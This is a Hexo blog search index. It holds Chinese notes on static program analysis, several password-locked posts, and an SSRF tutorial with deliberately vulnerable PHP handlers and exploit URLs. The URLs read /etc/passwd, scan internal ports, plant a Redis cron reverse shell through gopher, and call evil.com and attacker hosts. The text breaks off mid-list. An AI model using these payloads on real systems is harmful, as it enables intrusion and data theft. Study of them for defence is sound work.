<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>南京大学软件分析笔记</title>
    <link href="/2023/07/11/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/07/11/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>sound&amp;complete问题，sound代表“正确的我都说了”，complete代表“我说的都是正确的”。sound会造成高误报（False Positive），complete会造成高漏报（False Negative）。在实践中，偏向选择一个sound的结果，也就是宁可误报，也要把所有漏洞都报出来。</p><p>在确保soundness的前提下，尽可能靠近truth。达到精度和速度的平衡。</p><h1 id="Intermediate-Representation"><a href="#Intermediate-Representation" class="headerlink" title="Intermediate Representation"></a>Intermediate Representation</h1><h2 id="compilers-and-static-analyzers"><a href="#compilers-and-static-analyzers" class="headerlink" title="compilers and static analyzers"></a>compilers and static analyzers</h2><p>从source code 到 machine code流程</p><table><thead><tr><th></th><th>步骤</th><th>环节</th><th>工具</th><th>结果</th></tr></thead><tbody><tr><td>1</td><td>Scanner</td><td>Lexical Analysis</td><td>Regular Expression</td><td>Tokens</td></tr><tr><td>2</td><td>Parser</td><td>Syntax Analysis</td><td>Context-Free Grammer</td><td>AST</td></tr><tr><td>3</td><td>Type Checker</td><td>Semantic Analysis</td><td>Attribute Grammer</td><td>Decorated AST</td></tr><tr><td>4</td><td>Translator</td><td>Static Analysis（e.g., code optimization）</td><td>&#x2F;</td><td>IR</td></tr><tr><td>5</td><td>Code generator</td><td>&#x2F;</td><td>&#x2F;</td><td>MachineCode</td></tr></tbody></table><p>context-free grammar: 上下文非敏感文法，对语言文法的表达能力很弱于上下文敏感语法，但对于编程语言来说已经够用了</p><p>context-sensitive grammer：上下文敏感文法，对语言文法的表达能力很强，适合人类语言的表达</p><p>IR之前叫前端，IR之后叫后端</p><h2 id="AST-vs-三地址码（Three-Address-Code）"><a href="#AST-vs-三地址码（Three-Address-Code）" class="headerlink" title="AST vs 三地址码（Three Address Code）"></a>AST vs 三地址码（Three Address Code）</h2><table><thead><tr><th></th><th>层级</th><th>语言相关</th><th>控制流</th><th>应用领域</th></tr></thead><tbody><tr><td>AST</td><td>高级，与语法更近</td><td>相关</td><td>缺少控制流</td><td>做简单的类型检查</td></tr><tr><td>3AC</td><td>低级，与机器码更近</td><td>无关</td><td>包含控制流信息</td><td>压缩且通用</td></tr></tbody></table><p>三地址码：命令右侧只能有一个操作符，比如<code>T2=a+b+3;</code>&#x3D;&gt;<code>T1=a+b;T2=T1+3</code></p><h3 id="常见3AC形式"><a href="#常见3AC形式" class="headerlink" title="常见3AC形式"></a>常见3AC形式</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">x = y bop z<br>x = uop y<br>x = y<br><span class="hljs-keyword">goto</span> L<br><span class="hljs-keyword">if</span> x <span class="hljs-keyword">goto</span> L<br><span class="hljs-keyword">if</span> x rop y <span class="hljs-keyword">goto</span> L<br><br>x,y,z: address<br><span class="hljs-symbol">bop:</span> 二进制算数符或逻辑操作符<br><span class="hljs-symbol">uop:</span> 一元操作符（unary opeartion）(minus, negation, casting)<br><span class="hljs-symbol">L:</span> 表达程序位置的一个标签<br><span class="hljs-symbol">rop:</span> 比较操作符（&gt;,&lt;,==,&gt;=,&lt;=,etc.）<br><span class="hljs-keyword">goto</span> L: 无条件跳转unconditional jump<br><span class="hljs-keyword">if</span>...<span class="hljs-keyword">goto</span> L: conditional jump<br><br></code></pre></td></tr></table></figure><h2 id="3AC-real-static-analyzer-soot"><a href="#3AC-real-static-analyzer-soot" class="headerlink" title="3AC real  static analyzer: soot"></a>3AC real  static analyzer: soot</h2><p>jvm四种方法调用</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs delphi">invokespecial: call <span class="hljs-function"><span class="hljs-keyword">constructor</span>, <span class="hljs-title">call</span> <span class="hljs-title">superclass</span> <span class="hljs-title">methods</span>, <span class="hljs-title">call</span> <span class="hljs-title">private</span> <span class="hljs-title">methods</span></span><br><span class="hljs-function"><span class="hljs-title">invokevirutal</span>:</span> instance methods call (<span class="hljs-keyword">virtual</span> dispatch)<br>invokeinterface: cannot optimization, cheching <span class="hljs-keyword">interface</span> <span class="hljs-keyword">implementation</span><br>invokestatic: call <span class="hljs-keyword">static</span> methods<br><br>java <span class="hljs-number">7</span>: invokedynamic -&gt; Java <span class="hljs-keyword">static</span> typing, <span class="hljs-keyword">dynamic</span> language runs <span class="hljs-keyword">on</span> JVM<br><br>method signaturebao<span class="hljs-string">&#x27;han: classname, return type, method name(parameter1 type, parameter 2 type)</span><br></code></pre></td></tr></table></figure><h2 id="static-single-assignment-SSA"><a href="#static-single-assignment-SSA" class="headerlink" title="static single assignment (SSA)"></a>static single assignment (SSA)</h2><h2 id="Basic-blocks"><a href="#Basic-blocks" class="headerlink" title="Basic blocks"></a>Basic blocks</h2><h2 id="Control-Flow-Graph"><a href="#Control-Flow-Graph" class="headerlink" title="Control Flow Graph"></a>Control Flow Graph</h2>]]></content>
    
    
    <categories>
      
      <category>程序分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件供应商搜集新思路</title>
    <link href="/2023/03/27/%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E5%95%86%E6%90%9C%E9%9B%86%E6%96%B0%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/03/27/%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E5%95%86%E6%90%9C%E9%9B%86%E6%96%B0%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c9ac622bc34e2d79883b5e04f4a93ccc7b19f894cdc17b73c4f223ba42d16151"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>供应链攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次滑动验证码突破</title>
    <link href="/2022/08/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AA%81%E7%A0%B4/"/>
    <url>/2022/08/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AA%81%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="b796f14988caf817b873dd188b9bcda1ceebb8a1ec073d315baebf7254155967"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>secret</tag>
      
      <tag>验证码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python代码审计tricks</title>
    <link href="/2022/07/22/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1tricks/"/>
    <url>/2022/07/22/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1tricks/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7f9eb39f89a82241c3d835259a50bf41a8f54556e614bcb8d54c9312df0c76d6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf漏洞学习</title>
    <link href="/2022/06/02/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/02/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h1><p>SSRF服务端请求伪造。由攻击者构造请求使服务器发起请求。一般情况下，SSRF攻击的目标是从外网无法访问到的内网系统。正因为攻击请求由服务端发起，所以服务端能请求到与自身相连而与外网隔离的内网系统。形成原因是由于服务器提供从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。</p><h1 id="0x01-相关函数"><a href="#0x01-相关函数" class="headerlink" title="0x01 相关函数"></a>0x01 相关函数</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>注意事项：</p><ol><li><p>file_get_contents的gopher协议不能 UrlEncode</p></li><li><p>file_get_contents关于Gopher的302跳转有bug，导致利用失败</p></li><li><p>curl&#x2F;libcurl 7.43上gopher协议存在bug（%00截断），7.45以上无此bug</p></li><li><p>curl_exec()默认不跟踪跳转</p></li><li><p>file_get_contents() 支持php:&#x2F;&#x2F;input协议</p></li></ol><h3 id="curl-exec-版"><a href="#curl-exec-版" class="headerlink" title="curl_exec()版"></a>curl_exec()版</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br></code></pre></td></tr></table></figure><h3 id="file-get-contents-版"><a href="#file-get-contents-版" class="headerlink" title="file_get_contents()版"></a>file_get_contents()版</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br></code></pre></td></tr></table></figure><h3 id="fsockopen-版"><a href="#fsockopen-版" class="headerlink" title="fsockopen()版"></a>fsockopen()版</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) <br>    &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) <br>        &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#coding: utf-8</span><br><span class="hljs-keyword">import</span> urllib<br>url = <span class="hljs-string">&#x27;http://127.0.0.1&#x27;</span><br><span class="hljs-keyword">info</span> = urllib.urlopen(url)<br>print(<span class="hljs-keyword">info</span>.<span class="hljs-keyword">read</span>().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="0x02-常见场景"><a href="#0x02-常见场景" class="headerlink" title="0x02 常见场景"></a>0x02 常见场景</h1><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2899359012.jpg"></p><ul><li><p>分享功能，通过 URL 地址分享网页内容</p><p>早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的标签或者标签中content的文本内容作为显示以提供更好的用户体验</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务</p></li><li><p>在线翻译：通过URL地址翻译对应文本的内容。</p><p>提供此功能的国内公司有百度、有道等</p></li><li><p>图片加载与下载：通过URL地址加载或下载图片</p><p>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）</p></li><li><p>图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载</p></li><li><p>未公开的api实现以及其他调用URL的功能</p><p>此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p></li><li><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li><li><p>web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p></li><li><p>文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p></li><li><p>链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。</p></li><li><p>文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713">例子</a></p></li><li><p>PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;</code>元素或者CSS的url()函数。</p></li></ul><h1 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h1><h3 id="利用file协议读取本地文件"><a href="#利用file协议读取本地文件" class="headerlink" title="利用file协议读取本地文件"></a>利用file协议读取本地文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/ssrf.php?url=file:/</span><span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure><h3 id="利用http协议扫描内网web系统"><a href="#利用http协议扫描内网web系统" class="headerlink" title="利用http协议扫描内网web系统"></a>利用http协议扫描内网web系统</h3><p>即简单的get请求，可以用来内网web系统的情况，比如常见的web端口80，443，81，8080，8088</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/ssrf.php?url=http:/</span><span class="hljs-regexp">/127.0.0.1:8080</span><br></code></pre></td></tr></table></figure><h3 id="利用dict协议扫描端口开放情况"><a href="#利用dict协议扫描端口开放情况" class="headerlink" title="利用dict协议扫描端口开放情况"></a>利用dict协议扫描端口开放情况</h3><p>dict可以用来判断端口开放情况，获取服务的banner信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p<span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:3306</span><br></code></pre></td></tr></table></figure><h3 id="利用gopher协议打内网"><a href="#利用gopher协议打内网" class="headerlink" title="利用gopher协议打内网"></a>利用gopher协议打内网</h3><p>主要攻击redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用，主要利用gopher协议。<br>Gopher协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache也可以进行 GET、POST 请求。这极大拓宽了 SSRF 的攻击面。例如gopher协议打redis从而getshell。顺便提一句，打ubuntu中的redis无法使用反弹shell，具体看参考。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ip/ssrf.php?url=gopher%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A6379%<span class="hljs-number">2</span>F_%<span class="hljs-number">2</span>A3%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">243</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aset%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">241</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a1%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2456</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>A%<span class="hljs-number">2</span>F1%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Fdev%<span class="hljs-number">2</span>Ftcp%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">2</span>F2333%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>A4%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">246</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aconfig%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">243</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aset%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">243</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>adir%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2416</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>Fvar%<span class="hljs-number">2</span>Fspool%<span class="hljs-number">2</span>Fcron%<span class="hljs-number">2</span>F%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>A4%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">246</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aconfig%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">243</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aset%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2410</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>adbfilename%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">244</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aroot%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>A1%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">244</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>asave%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">2</span>A1%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a%<span class="hljs-number">244</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aquit%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>a<br></code></pre></td></tr></table></figure><h3 id="其他支持的协议"><a href="#其他支持的协议" class="headerlink" title="其他支持的协议"></a>其他支持的协议</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp:<span class="hljs-regexp">//</span><br>ssrf.php?url=ftp:<span class="hljs-regexp">//</span>evil.com:<span class="hljs-number">12345</span>/TEST<br><br>file:<span class="hljs-regexp">//</span><br>ssrf.php?url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>password<br><br>Dict:<span class="hljs-regexp">//</span><br>dict:<span class="hljs-regexp">//</span>&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;<br>ssrf.php?url=dict:<span class="hljs-regexp">//</span>attacker:<span class="hljs-number">11111</span>/<br><br>SFTP:<span class="hljs-regexp">//</span><br>ssrf.php?url=sftp:<span class="hljs-regexp">//</span>example.com:<span class="hljs-number">11111</span>/<br><br>TFTP:<span class="hljs-regexp">//</span><br>ssrf.php?url=tftp:<span class="hljs-regexp">//</span>example.com:<span class="hljs-number">12346</span>/TESTUDPPACKET<br><br>LDAP:<span class="hljs-regexp">//</span><br>ssrf.php?url=ldap:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">11211</span>/%<span class="hljs-number">0</span>astats%<span 